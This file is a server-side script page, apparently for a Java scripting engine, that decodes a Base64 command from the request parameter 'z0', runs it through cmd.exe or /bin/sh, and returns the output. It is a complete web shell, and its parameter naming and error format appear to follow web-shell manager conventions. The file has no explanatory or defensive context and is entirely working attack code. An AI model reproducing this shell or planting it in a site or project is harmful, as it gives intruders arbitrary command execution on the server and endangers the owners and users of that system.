<%

var paramMap = request.getParameterMap();
var szCommand = "";
var szEncoding = "UTF-8";

if (paramMap.containsKey("z0")) {
    var b64Cmd = paramMap.get("z0")[0];
    if (b64Cmd != null && b64Cmd != "") {
        szCommand = new java.lang.String(java.util.Base64.getDecoder().decode(b64Cmd), "UTF-8");
    }
}

if (paramMap.containsKey("z1")) {
    var b64Enc = paramMap.get("z1")[0];
    if (b64Enc != null && b64Enc != "") {
        szEncoding = new java.lang.String(java.util.Base64.getDecoder().decode(b64Enc), "UTF-8");
    }
}

if (szCommand == "") {
    echo("ERROR://Command is empty.");
} else {
    try {
        var os = java.lang.System.getProperty("os.name").toLowerCase();
        var cmdArray = [];
        
        if (os.contains("win")) {
            cmdArray = ["cmd.exe", "/c", szCommand];
        } else {
            cmdArray = ["/bin/sh", "-c", szCommand];
        }

        var pb = new java.lang.ProcessBuilder(cmdArray);
        pb.redirectErrorStream(true);

        var process = pb.start();
        var is = process.getInputStream();
        var reader = new java.io.BufferedReader(new java.io.InputStreamReader(is, szEncoding));
        
        var line = "";
        var output = new java.lang.StringBuilder();
        
        while ((line = reader.readLine()) != null) {
            output.append(line).append("\n");
        }
        
        var nRetVal = process.waitFor();
        
        if (nRetVal === 0) {
            echo(output.toString());
        } else {
            var errMsg = output.toString();
            if (errMsg != "") {
                echo(errMsg);
            }

            echo("ret=" + nRetVal);
        }

    } catch (e) {
        echo("ERROR://" + e.message);
    }
}

%>